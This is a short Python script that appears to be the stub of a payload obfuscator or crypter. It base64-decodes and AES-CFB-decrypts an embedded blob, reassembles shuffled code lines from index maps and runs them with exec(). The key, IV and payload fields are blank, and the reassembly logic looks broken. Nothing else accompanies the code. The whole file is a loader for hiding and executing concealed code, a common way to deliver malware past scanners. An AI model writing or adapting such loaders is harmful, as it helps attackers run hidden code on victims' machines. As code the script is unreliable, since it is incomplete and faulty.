#!/usr/bin/python
import Crypto,base64
from Crypto.Cipher import AES
from base64 import b64decode, b64encode

def ddc(pld,key,iv):
    obj3 = AES.new(key,AES.MODE_CFB,iv)
    cd = obj3.decrypt(pld)

    return cd
def exddc(pld,key,iv):
    cP = pld
    out = b64decode(cP)
    x = ddc(out,key,iv)
    return x
def rcnLn(shfLn,arrMap):
    cmd=""
    
    
    for indice in arrMap:
        cmd = "{}{}".format(str(cmd),str(shfLn[indice]))
    

    return cmd
    
def rcnPld(shfPld):
    exec(shfPld)
    for key in shfPld:
        key = int(key)
        cmd = ""
        shfLn = shfPld[key][0]
        
         
        arrMap = shfPld[key][1] 
        cmd = rcnLn(shfLn,arrMap)
        exec(cmd)
        
    return

key=
iv=
pld=

def mn(xc=pld):
    cd=xc
    sP = exddc(cd,key,iv)
    
    
    
    nS = "shfPld={}".format(str(sP))
    
    rcnPld(nS)
    return
mn()
